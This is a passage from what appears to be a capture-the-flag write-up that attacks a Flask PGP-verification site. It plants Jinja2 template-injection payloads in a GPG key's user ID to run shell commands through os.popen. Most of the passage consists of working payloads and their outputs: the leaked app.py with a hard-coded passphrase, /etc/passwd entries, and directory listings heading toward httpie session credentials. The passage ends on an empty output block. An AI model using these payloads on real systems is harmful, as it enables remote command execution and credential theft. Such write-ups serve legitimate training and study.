_apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false silentobserver:x:1001:1001::/home/silentobserver:/bin/bash atlas:x:1000:1000::/home/atlas:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false " [unknown] [GNUPG:] VALIDSIG D43BAA8CF9166B57ABDD908F34AA572E1AEFA923 2023-06-17 1687035771 0 4 0 1 10 01 D43BAA8CF9166B57ABDD908F34AA572E1AEFA923 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: D43B AA8C F916 6B57 ABDD 908F 34AA 572E 1AEF A923
```

| Username |
| --- |
| silentobserver |

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("cat ./SSA/app.py").read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sat 17 Jun 2023 08:48:05 PM UTC gpg: using RSA key 1ACD15DF1D2CB809AAB3663F2C827D8BCA0104C2 [GNUPG:] KEY_CONSIDERED 1ACD15DF1D2CB809AAB3663F2C827D8BCA0104C2 0 [GNUPG:] SIG_ID XhiCgQgcVQBP+a91fsUQKmDGScE 2023-06-17 1687034885 [GNUPG:] KEY_CONSIDERED 1ACD15DF1D2CB809AAB3663F2C827D8BCA0104C2 0 [GNUPG:] GOODSIG 2C827D8BCA0104C2 from flask import Flask, render_template, Response, flash, request, Blueprint, redirect, flash, url_for, render_template_string, jsonify from flask_login import login_required, login_user, logout_user from werkzeug.security import check_password_hash import hashlib from . import db import os from datetime import datetime import gnupg from SSA.models import User main = Blueprint('main', __name__) gpg = gnupg.GPG(gnupghome='/home/atlas/.gnupg', options=['--ignore-time-conflict']) @main.route("/") def home(): return render_template("index.html", name="home") @main.route("/about") def about(): return render_template("about.html", name="about") @main.route("/contact", methods=('GET', 'POST',)) def contact(): if request.method == 'GET': return render_template("contact.html", name="contact") tip = request.form['encrypted_text'] if not validate(tip): return render_template("contact.html", error_msg="Message is not PGP-encrypted.") msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: tip = msg.data.decode('utf-8') msg = "Thank you for your submission." save(tip, request.environ.get('HTTP_X_REAL_IP', request.remote_addr)) return render_template("contact.html", error_msg=msg) @main.route("/guide", methods=('GET', 'POST')) def guide(): if request.method == 'GET': return render_template("study.html", name="guide") elif request.method == 'POST': encrypted = request.form['encrypted_text'] if not validate(encrypted): pass msg = gpg.decrypt(encrypted, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: msg = msg.data.decode('utf-8') return render_template("study.html", name="guide", dec_msg=msg) @main.route("/guide/encrypt", methods=('GET', 'POST',)) def encrypt(): if request.method == 'GET': return render_template("study.html") pubkey = request.form['pub_key'] import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_pub="Invalid key format.") fp = import_result.fingerprints[0] now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") key_uid = ', '.join([key['uids'] for key in gpg.list_keys() if key['fingerprint'] == fp][0]) message = f"""This is an encrypted message for {key_uid}.\n\nIf you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.\n\nCongratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.\n\nSSA: {now}""" enc_msg = gpg.encrypt(message, recipients=fp, always_trust=True) if not enc_msg.ok: return render_template("study.html", error_msg="Something went wrong.") return render_template("study.html", enc_msg=enc_msg) @main.route("/guide/verify", methods=('GET', 'POST',)) def verify(): if request.method == 'GET': return render_template("study.html") signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_key="Key import failed. Make sure your key is properly formatted.") else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template("study.html", error_msg_sig=msg) return render_template("study.html", error_msg_key="Something went wrong.") @main.route("/process", methods=("POST",)) def process_form(): signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: msg = "Key import failed. Make sure your key is properly formatted." else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template_string(msg) @main.route("/pgp") def pgp(): return render_template("pgp.html", name="pgp") @main.route("/admin") @login_required def admin(): entries = [] with open('SSA/submissions/log', 'r') as f: for i, line in enumerate(f): if i <= 7: continue ip, fname, dtime = line.strip().split(":") entries.append({ 'id': i-7, 'ip': ip, 'fname': fname, 'dtime': dtime }) return render_template("admin.html", name="admin", entries=entries) @main.route("/view", methods=('GET', 'POST',)) @login_required def view(): fname = request.args.get('fname') try: if not fname.endswith('.txt'): flask.abort(400) with open(f"SSA/submissions/{fname}", 'r') as f: msg = f.read() except Exception as _: msg = 'Something went wrong.' return render_template("view.html", name="view", dec_msg=msg) @main.route("/login", methods=('GET', 'POST')) def login(): if request.method == 'GET': return render_template("login.html", name="login") uname = request.form['username'] pwd = request.form['password'] user = User.query.filter_by(username=uname).first() if not user or not check_password_hash(user.password, pwd): flash('Invalid credentials.') return redirect(url_for('main.login')) login_user(user, remember=True) return redirect(url_for('main.admin')) @main.route("/logout") @login_required def logout(): logout_user() return redirect(url_for('main.home')) def validate(msg): if msg[:27] == '-----BEGIN PGP MESSAGE-----' and msg[-27:].strip() == '-----END PGP MESSAGE-----': return True return False def save(msg, ip): fname = os.urandom(16).hex() + ".txt" now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") with open("SSA/submissions/log", "a") as f: f.write(f"{ip}:{fname}:{now}\n") with open(f"SSA/submissions/{fname}", "w") as f: f.write(msg) gpg: Good signature from "from flask import Flask, render_template, Response, flash, request, Blueprint, redirect, flash, url_for, render_template_string, jsonify from flask_login import login_required, login_user, logout_user from werkzeug.security import check_password_hash import hashlib from . import db import os from datetime import datetime import gnupg from SSA.models import User main = Blueprint('main', __name__) gpg = gnupg.GPG(gnupghome='/home/atlas/.gnupg', options=['--ignore-time-conflict']) @main.route("/") def home(): return render_template("index.html", name="home") @main.route("/about") def about(): return render_template("about.html", name="about") @main.route("/contact", methods=('GET', 'POST',)) def contact(): if request.method == 'GET': return render_template("contact.html", name="contact") tip = request.form['encrypted_text'] if not validate(tip): return render_template("contact.html", error_msg="Message is not PGP-encrypted.") msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: tip = msg.data.decode('utf-8') msg = "Thank you for your submission." save(tip, request.environ.get('HTTP_X_REAL_IP', request.remote_addr)) return render_template("contact.html", error_msg=msg) @main.route("/guide", methods=('GET', 'POST')) def guide(): if request.method == 'GET': return render_template("study.html", name="guide") elif request.method == 'POST': encrypted = request.form['encrypted_text'] if not validate(encrypted): pass msg = gpg.decrypt(encrypted, passphrase='$M1DGu4rD$') if msg.data == b'': msg = 'Message was encrypted with an unknown PGP key.' else: msg = msg.data.decode('utf-8') return render_template("study.html", name="guide", dec_msg=msg) @main.route("/guide/encrypt", methods=('GET', 'POST',)) def encrypt(): if request.method == 'GET': return render_template("study.html") pubkey = request.form['pub_key'] import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_pub="Invalid key format.") fp = import_result.fingerprints[0] now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") key_uid = ', '.join([key['uids'] for key in gpg.list_keys() if key['fingerprint'] == fp][0]) message = f"""This is an encrypted message for {key_uid}.\n\nIf you can read this, it means you successfully used your private PGP key to decrypt a message meant for you and only you.\n\nCongratulations! Feel free to keep practicing, and make sure you also know how to encrypt, sign, and verify messages to make your repertoire complete.\n\nSSA: {now}""" enc_msg = gpg.encrypt(message, recipients=fp, always_trust=True) if not enc_msg.ok: return render_template("study.html", error_msg="Something went wrong.") return render_template("study.html", enc_msg=enc_msg) @main.route("/guide/verify", methods=('GET', 'POST',)) def verify(): if request.method == 'GET': return render_template("study.html") signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: return render_template("study.html", error_msg_key="Key import failed. Make sure your key is properly formatted.") else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template("study.html", error_msg_sig=msg) return render_template("study.html", error_msg_key="Something went wrong.") @main.route("/process", methods=("POST",)) def process_form(): signed = request.form['signed_text'] pubkey = request.form['public_key'] if signed and pubkey: import_result = gpg.import_keys(pubkey) if import_result.count == 0: msg = "Key import failed. Make sure your key is properly formatted." else: fp = import_result.fingerprints verified = gpg.verify(signed) if verified.status == 'signature valid': msg = f"Signature is valid!\n\n{verified.stderr}" else: msg = "Make sure your signed message is properly formatted." # Cleanup - delete key gpg.delete_keys(fp) return render_template_string(msg) @main.route("/pgp") def pgp(): return render_template("pgp.html", name="pgp") @main.route("/admin") @login_required def admin(): entries = [] with open('SSA/submissions/log', 'r') as f: for i, line in enumerate(f): if i <= 7: continue ip, fname, dtime = line.strip().split(":") entries.append({ 'id': i-7, 'ip': ip, 'fname': fname, 'dtime': dtime }) return render_template("admin.html", name="admin", entries=entries) @main.route("/view", methods=('GET', 'POST',)) @login_required def view(): fname = request.args.get('fname') try: if not fname.endswith('.txt'): flask.abort(400) with open(f"SSA/submissions/{fname}", 'r') as f: msg = f.read() except Exception as _: msg = 'Something went wrong.' return render_template("view.html", name="view", dec_msg=msg) @main.route("/login", methods=('GET', 'POST')) def login(): if request.method == 'GET': return render_template("login.html", name="login") uname = request.form['username'] pwd = request.form['password'] user = User.query.filter_by(username=uname).first() if not user or not check_password_hash(user.password, pwd): flash('Invalid credentials.') return redirect(url_for('main.login')) login_user(user, remember=True) return redirect(url_for('main.admin')) @main.route("/logout") @login_required def logout(): logout_user() return redirect(url_for('main.home')) def validate(msg): if msg[:27] == '-----BEGIN PGP MESSAGE-----' and msg[-27:].strip() == '-----END PGP MESSAGE-----': return True return False def save(msg, ip): fname = os.urandom(16).hex() + ".txt" now = datetime.now().strftime("%m/%d/%Y-%H;%M;%S") with open("SSA/submissions/log", "a") as f: f.write(f"{ip}:{fname}:{now}\n") with open(f"SSA/submissions/{fname}", "w") as f: f.write(msg) " [unknown] [GNUPG:] VALIDSIG 1ACD15DF1D2CB809AAB3663F2C827D8BCA0104C2 2023-06-17 1687034885 0 4 0 1 10 01 1ACD15DF1D2CB809AAB3663F2C827D8BCA0104C2 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 1ACD 15DF 1D2C B809 AAB3 663F 2C82 7D8B CA01 04C2
```

| Password |
| --- |
| $M1DGu4rD$ |

To speed things up a bit, I created a oneline.

```c
rm -rf ~/.gnupg && gpg --gen-key && gpg --armor --export foobar@foobar.local > pubkey.asc && cat pubkey.asc && echo 'foobar' | gpg --clear-sign
```

```c
$ rm -rf ~/.gnupg && gpg --gen-key && gpg --armor --export foobar@foobar.local > pubkey.asc && cat pubkey.asc && echo 'foobar' | gpg --clear-sign
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: directory '/home/user/.gnupg' created
gpg: keybox '/home/user/.gnupg/pubring.kbx' created
Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/').read() }}
Email address: foobar@foobar.local
You selected this USER-ID:
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/').read() }} <foobar@foobar.local>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: /home/user/.gnupg/trustdb.gpg: trustdb created
gpg: directory '/home/user/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/user/.gnupg/openpgp-revocs.d/5550D47E50E37C6F55C5585A95E5C44DCAD017CB.rev'
public and secret key created and signed.

pub   rsa3072 2023-06-18 [SC] [expires: 2025-06-17]
      5550D47E50E37C6F55C5585A95E5C44DCAD017CB
uid                      {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/').read() }} <foobar@foobar.local>
sub   rsa3072 2023-06-18 [E] [expires: 2025-06-17]

-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGSOkR0BDADMv+ESf2TE/azxVhaRoVy1jFcGgTZA7wiFD4ePU5mBD5+doSsT
0r1aHmKrcV+LVtsbCY3LEl0B1vNlObHun4029PaN4IHXqalDW618an6hmcrpYCmi
w0ZTxeCkk1z7SZthjtzNrBmvHMXeDvmNuksCVteFYTfaL3bC7BE3hotXXq7tz3Nm
ktt0Ce6wGK1R4Idd66fG0sill78ekyT4rK6rjr/uXKdcMPuuskLKdabv+o8tuEe1
UbQvx4xL71/K1GZtmunJQpHJac14514qYb5HYuC96DNx+txgy+YMkx2NCFejOohu
AtyXrbJ3+3iYsEM4ywe1ZPyyGmZKCUl2MCaubSuy8WnmzW+zbkLNnqh8nDpa2pqu
ZbIWzO+ohhWSSLaQq+XH7EzlRPRVPKlABINyXYG4UEkZfd5wGAbAC1gE4TqEQ1oe
yJmOlH1ZrchS+Ul/sPGiw+3RWKnEMdjJa81snAcdpR6braL1YtjYDtFE7SY30pqH
wmozKSgLMvLoxG0AEQEAAbR3e3sgc2VsZi5fX2luaXRfXy5fX2dsb2JhbHNfXy5f
X2J1aWx0aW5zX18uX19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMgLWxhIC9ob21l
L2F0bGFzLycpLnJlYWQoKSB9fSA8Zm9vYmFyQGZvb2Jhci5sb2NhbD6JAdQEEwEK
AD4WIQRVUNR+UON8b1XFWFqV5cRNytAXywUCZI6RHQIbAwUJA8JnAAULCQgHAgYV
CgkICwIEFgIDAQIeAQIXgAAKCRCV5cRNytAXy885DADL4tzAgwS5ZllYuO6n9ICk
0sjqYXOsx2a+2ovyQMN9c8GfMpSq6w9B3jKRUxlD2daBPaIGpyTPNHtJWmqJCDMX
eM3z9GvJNmMEQ3PWVKHLk/FpktBjxR01xtZL0ZaZfUcm1p27foQWQIFBzJhB1Em5
ev5mGRvpdYVGVIPY5vk7PwrYDbW/vyMrhh91jtgbbfZ1Cz7XROZf0aeffCCAZfEh
oyHaYb1bSprddX/hzKGJ0sOWmaDfMLSa2hGFjotdubfnS32xuYPHUhvQm972yVOB
X62coQeKDDEhgk9FFXZOa4hMJHnSsm+t0vIkp1ebhdyZFHCAoNXxXa5DYB7IqCkq
HK13VqliXFbA1MEvVHk9vC5nOdgRk0XhW2LrreQBYobLAaR1kw9IsNgctOSfQuG1
V72j9SoeE2AI7uOTpdNn/EMnt6hOm1JWJjtUDO7ZxZb0dCSLuMzdT6+jA45jp0cy
cmQ8Mh7pMH0G8sao1GwsT+fhPX9+4snF5Cz6naGePG65AY0EZI6RHQEMAPFV2GdS
owM3XAZmzjgWfWlnLpOeaFcVUzQNt+HHcsACrayCSUztOHp2t3L02uSF3Hqe/oLO
nbxs4dhRcFNYwCMJE4LRAf5N6HTs4oUEcSG7kabLDFegowAIDbFA9N+gCtYPwtNI
MPU1FrPSBRheIDBbwCr6aTGV9RzMG+YPkEkctk9tvYpU1G5U6geYFrpIJ1XmLl2s
pGG/baByd+/lCpTbmk0BsJrln/Kkbukr7DSwpRN6q2KDXVNGz+wxR+6E8ESd5Jdm
I5eXmL3v25azZd8qs/SU1vuh3cwu6QPQYELwCnqTkCj+lrKlU0KiGd6XaCsZMA/f
j5Jne3OeVouF8rU2qdOkFMhBku2gy6RtqCiFnPiVnjrTouGWzaSIpBtX901s+ER2
zuGtIrP21IktbPm7LeedTz8Mgozri9K+LgMqo4LxgTpwp+HzeyiuzyR1BExNapWy
wyD9XxNWoWsw/qYLZTWI8s0kkRHy3cXnBsMdc07Gi9w28hoEMxG6quoQCwARAQAB
iQG8BBgBCgAmFiEEVVDUflDjfG9VxVhaleXETcrQF8sFAmSOkR0CGwwFCQPCZwAA
CgkQleXETcrQF8tC2wwAqbL/2WcW8noLdocmtB/fmOektfrfio5M3gHUYE7SjIpQ
4hhjIkuNaU5s43Z2NIkbgORRHwPI1RrzDxRZUwSmFXIdm5P9MNjlGkaNFUmIM3i9
zssKLp0jBdLs+6x8AG3JszORhtrJ5dtZktvlmVoEcAcqaiZ2Mz7oO3FaFc0K8GPs
oScpBXzi/HP10xAE4V0SlsjhtYX/LT56N40VoDStevHhzOpy1lPo4FUvw4GoBTpW
ofgiWT2RfHivSIaIK3AmASDfNS+jiClpR3yRrRBikbwDWFhBUsrfiLq7JmG0p7k6
i71eb7ZE8H8ru2Z8VFGBVGYwM8cFiZXCM/BdyKnOKKNVh/SyYcDoUEfDJ6IJlhy3
UWirFQWnF+SThLjgN8TwIlBM/Ycr1alvBCQtCJiwcA+3sxqfxKbtnhDK+CUZLGsC
/ygEI1dus3mhiN3DZoVbtzHmscTHwy9/ekoimk6rVeNBVRU8rJUywvPiy81GS4xB
rXoWZKopZeK7SuZVldbB
=0qyb
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

foobar
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEVVDUflDjfG9VxVhaleXETcrQF8sFAmSOkScACgkQleXETcrQ
F8uG4wwAuHRGt88IrtSTKyZ10Vz2O45CZ+eyHnDQHriboVWK3yqr2QrRE0j3c1uv
4TGqDpXH+LBXQZk5cSk9ofeqlOElMAYoXtuFg0CBG7M4rYM976yyL3sPNbQb/RLJ
et61XkYWgT+hyW6v4uyEOBsL50zeyDc+2QIoEsC3n5vbWpGOD+5cS+J5Tx+/mj/5
LPscBlElkjduMFPrNuG3MEXNOPVIRDp+3TjWx/d25EN5pbR4C7Nlhk/vqvbifUy1
mmfAfxAbebUNEuXLT0ClW/SeBeJPv0f83gAsRLfOPNSC0PvjooJkP25JkBGoQTTU
iYf0Rwu2IZRFfNI7CHuvSooEEFHTaim6vvK4h9d08iBZecrihfUSzc9iHsfcyNzT
7+BLxe5RgGQv1Zuh7//uTcHKBhHhCj+qW755M1kklDg447/TR63+bgeS2dhJFkDU
SEYOux2gE2YedyF4T1BZW5kYVf1qjPLOuotODnGSiiHtE/nqPS9Kdw21hkdPAf9k
bEXZa2y2
=JVjm
-----END PGP SIGNATURE-----
```

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:07:51 AM UTC gpg: using RSA key 5550D47E50E37C6F55C5585A95E5C44DCAD017CB [GNUPG:] KEY_CONSIDERED 5550D47E50E37C6F55C5585A95E5C44DCAD017CB 0 [GNUPG:] SIG_ID 1Kv8yYfKuMgloNLEvpNpSPZs97o 2023-06-18 1687064871 [GNUPG:] KEY_CONSIDERED 5550D47E50E37C6F55C5585A95E5C44DCAD017CB 0 [GNUPG:] GOODSIG 95E5C44DCAD017CB total 44 drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 . drwxr-xr-x 4 nobody nogroup 4096 May 4 15:19 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -> /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 10:30 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .config drwx------ 4 atlas atlas 4096 Jun 18 05:13 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 10:33 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Feb 6 10:34 .ssh gpg: Good signature from "total 44 drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 . drwxr-xr-x 4 nobody nogroup 4096 May 4 15:19 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -> /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 10:30 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .config drwx------ 4 atlas atlas 4096 Jun 18 05:13 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 10:33 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Feb 6 10:34 .ssh " [unknown] [GNUPG:] VALIDSIG 5550D47E50E37C6F55C5585A95E5C44DCAD017CB 2023-06-18 1687064871 0 4 0 1 10 01 5550D47E50E37C6F55C5585A95E5C44DCAD017CB [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 5550 D47E 50E3 7C6F 55C5 585A 95E5 C44D CAD0 17CB
```

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/.config/').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:11:11 AM UTC gpg: using RSA key CE232E67FA3A4E0F0DD58DC4B3D27E7DA4D1523A [GNUPG:] KEY_CONSIDERED CE232E67FA3A4E0F0DD58DC4B3D27E7DA4D1523A 0 [GNUPG:] SIG_ID 9Q6oFq2gai4iXkDLnocdgjwF1HE 2023-06-18 1687065071 [GNUPG:] KEY_CONSIDERED CE232E67FA3A4E0F0DD58DC4B3D27E7DA4D1523A 0 [GNUPG:] GOODSIG B3D27E7DA4D1523A total 12 drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 . drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 .. dr-------- 2 nobody nogroup 40 Jun 18 04:59 firejail drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 httpie gpg: Good signature from "total 12 drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 . drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 .. dr-------- 2 nobody nogroup 40 Jun 18 04:59 firejail drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 httpie " [unknown] [GNUPG:] VALIDSIG CE232E67FA3A4E0F0DD58DC4B3D27E7DA4D1523A 2023-06-18 1687065071 0 4 0 1 10 01 CE232E67FA3A4E0F0DD58DC4B3D27E7DA4D1523A [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: CE23 2E67 FA3A 4E0F 0DD5 8DC4 B3D2 7E7D A4D1 523A 
```

Payload:

```c
rm -rf ~/.gnupg && gpg --gen-key && gpg --armor --export foobar@foobar.local > pubkey.asc && cat pubkey.asc && echo 'foobar' | gpg --clear-sign
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:16:47 AM UTC gpg: using RSA key D4ED09AE0E975F02C3330C4C0899DF62F6D3D193 [GNUPG:] KEY_CONSIDERED D4ED09AE0E975F02C3330C4C0899DF62F6D3D193 0 [GNUPG:] SIG_ID y0Fad7oWlzjem5io4HTU7Ki03lA 2023-06-18 1687065407 [GNUPG:] KEY_CONSIDERED D4ED09AE0E975F02C3330C4C0899DF62F6D3D193 0 [GNUPG:] GOODSIG 0899DF62F6D3D193 total 12 drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 . drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .. drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 sessions gpg: Good signature from "total 12 drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 . drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .. drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 sessions " [unknown] [GNUPG:] VALIDSIG D4ED09AE0E975F02C3330C4C0899DF62F6D3D193 2023-06-18 1687065407 0 4 0 1 10 01 D4ED09AE0E975F02C3330C4C0899DF62F6D3D193 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: D4ED 09AE 0E97 5F02 C333 0C4C 0899 DF62 F6D3 D193
```

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/.config/httpie/').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:26:36 AM UTC gpg: using RSA key E399FB2BC776AB8AFA03BA454FB7A7DBDFF0C0EE [GNUPG:] KEY_CONSIDERED E399FB2BC776AB8AFA03BA454FB7A7DBDFF0C0EE 0 [GNUPG:] SIG_ID e4CP3Pkbt9FIuMtrCiqsaI8PcXI 2023-06-18 1687065996 [GNUPG:] KEY_CONSIDERED E399FB2BC776AB8AFA03BA454FB7A7DBDFF0C0EE 0 [GNUPG:] GOODSIG 4FB7A7DBDFF0C0EE total 12 drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 . drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .. drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 sessions gpg: Good signature from "total 12 drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 . drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .. drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 sessions " [unknown] [GNUPG:] VALIDSIG E399FB2BC776AB8AFA03BA454FB7A7DBDFF0C0EE 2023-06-18 1687065996 0 4 0 1 10 01 E399FB2BC776AB8AFA03BA454FB7A7DBDFF0C0EE [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: E399 FB2B C776 AB8A FA03 BA45 4FB7 A7DB DFF0 C0EE
```

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/.config/httpie/sessions/').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:28:32 AM UTC gpg: using RSA key 63DBDF727CAB983723103C65A0E8E6417F1BF6E7 [GNUPG:] KEY_CONSIDERED 63DBDF727CAB983723103C65A0E8E6417F1BF6E7 0 [GNUPG:] SIG_ID wbIRHa+phgCj8TzbhTZ1t8PvQJw 2023-06-18 1687066112 [GNUPG:] KEY_CONSIDERED 63DBDF727CAB983723103C65A0E8E6417F1BF6E7 0 [GNUPG:] GOODSIG A0E8E6417F1BF6E7 total 12 drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 . drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 .. drwxrwx--- 2 nobody atlas 4096 May 4 17:30 localhost_5000 gpg: Good signature from "total 12 drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 . drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 .. drwxrwx--- 2 nobody atlas 4096 May 4 17:30 localhost_5000 " [unknown] [GNUPG:] VALIDSIG 63DBDF727CAB983723103C65A0E8E6417F1BF6E7 2023-06-18 1687066112 0 4 0 1 10 01 63DBDF727CAB983723103C65A0E8E6417F1BF6E7 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 63DB DF72 7CAB 9837 2310 3C65 A0E8 E641 7F1B F6E7
```

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /home/atlas/.config/httpie/sessions/localhost_5000/').read() }}
```

Output:

```c
